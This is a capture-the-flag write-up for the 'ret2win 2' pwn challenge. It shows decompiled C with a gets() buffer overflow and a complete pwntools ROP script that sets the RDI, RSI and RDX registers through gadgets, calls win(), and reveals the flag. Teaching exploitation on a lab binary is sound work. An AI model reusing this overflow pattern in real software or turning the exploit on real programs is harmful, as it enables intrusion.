# [Pwn] ret2win 2

## 📚 Overview

> *"Introduction to Return Oriented Programming (ROP). Di arsitektur x86-64, 3 argumen pertama dari saat memanggil fungsi diambil dari register RDI, RSI, dan RDX. Dengan tools seperti ropper atau ROPgadget, kita bisa dapetin gadget yang bisa ngisi register-register itu dengan nilai yang kita inginkan."*

## 💻 Decompiled Code

Similar to the previous challenge but this time we have to overwrite the RDI, RSI, and RDX registers *in addition*. Inside the binary itself, we have a `gadget()` function which provided us with the gadgets that help us in overwriting the registers.

```c
void win(long param_1,long param_2,long param_3)
{
  char flag [104];
  FILE *file;
  
  file = fopen("flag.txt","r");
  if (((param_1 != -0x2152411021524111) || (param_2 != -0x5432edcb2345bcdf)) ||
     (param_3 != 0x147147147147147)) {
    puts("No hacking!");
    FUN_00401120(0xffffffff);
  }
  if (file == (FILE *)0x0) {
    puts("flag.txt not found");
    FUN_00401120(0xffffffff);
  }
  fgets(flag,100,file);
  fclose(file);
  printf("Wow, how did you get here? Here\'s the flag:\n%s\n",flag);
  return;
}

undefined8 main(void)
{
  char buffer [112];
  
  printf("Give me your payload: ");
  gets(buffer);
  return 0;
}
```

## ⚙ Full Script

**Payload >** Overflow the buffer to reach the stack, use the gadgets to insert the parameters' value on the stack, and then overwrite the RIP with `win()` address.

```python
from pwn import *
elf = context.binary = ELF("./ret2win", checksec=False)

p = process('./ret2win')
# p = remote("IP_ADDR", PORT)

offset = 0x78
RET_ADDR = 0x40101a
WIN_ADDR = elf.symbols.win
pop_rdi = p64(0x40121e)
pop_rsi = p64(0x401220)
pop_rdx = p64(0x401222)

rop = ROP(elf)
rop.raw(RET_ADDR)
rop.raw(WIN_ADDR)

payload = b'A' * offset
payload += pop_rdi + p64(0xDEADBEEFDEADBEEF)
payload += pop_rsi + p64(0xABCD1234DCBA4321)
payload += pop_rdx + p64(0x147147147147147)
payload += rop.chain()
p.sendlineafter(b'Give me your payload: ', payload)

response = (p.recvall(timeout=1).strip())[:-8]
print(response.decode())

# TCP1P{pop_rdi_pop_rsi_pop_rdx_sangat_diincar_heker}

p.close()
```